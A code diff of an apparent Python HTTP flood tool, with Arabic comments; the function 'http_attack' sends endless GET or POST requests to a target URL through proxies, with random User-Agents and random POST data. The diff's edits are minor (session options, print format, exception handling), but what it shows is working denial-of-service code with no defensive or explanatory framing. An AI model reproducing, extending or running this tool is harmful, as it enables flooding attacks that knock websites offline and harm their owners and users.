@@ -31,7 +31,7 @@ def random_post_data(length=50):
 
 # هجوم HTTP مع عداد للطلبات الناجحة والفاشلة
 async def http_attack(target, proxy=None, method="GET", headers=None, success_counter=None, failure_counter=None):
-    async with aiohttp.ClientSession(trust_env=True) as session:  # استخدام trust_env لدعم البروكسيات
+    async with aiohttp.ClientSession() as session:
         while True:
             headers = headers or {'User-Agent': str(ua.random)}  # توليد User-Agent عشوائي
             try:
@@ -39,14 +39,14 @@ async def http_attack(target, proxy=None, method="GET", headers=None, success_co
                     # توليد بيانات POST عشوائية
                     data = random_post_data()
                     async with session.post(target, headers=headers, proxy=proxy, data=data) as res:
-                        print(f"{Fore.GREEN}({success_counter[0]}) Request sent (POST) | Status: {Fore.YELLOW}{res.status}{Style.RESET_ALL}")
+                        print(f"{Fore.GREEN} Request sent (POST) | Status: {Fore.YELLOW}{res.status}{Style.RESET_ALL}")
                         success_counter[0] += 1  # زيادة العداد
                 else:
                     async with session.get(target, headers=headers, proxy=proxy) as res:
-                        print(f"{Fore.GREEN}({success_counter[0]}) Request sent (GET) | Status: {Fore.YELLOW}{res.status}{Style.RESET_ALL}")
+                        print(f"{Fore.GREEN} Request sent (GET) | Status: {Fore.YELLOW}{res.status}{Style.RESET_ALL}")
                         success_counter[0] += 1  # زيادة العداد
 
-            except aiohttp.ClientError as e:  # استخدام استثناءات aiohttp فقط
+            except Exception as e:
                 print(f"{Fore.RED}[ ! ] An error occurred: {str(e)}{Style.RESET_ALL}")
                 failure_counter[0] += 1  # زيادة العداد للفشل
             await asyncio.sleep(0.1)  # تأخير بين الطلبات لتقليل الضغط
@@ -94,3 +94,5 @@ if __name__ == "__main__":
         exit("Invalid method! Please choose GET or POST.")
 
     asyncio.run(main(url, threads, proxies, method))
+    
+    
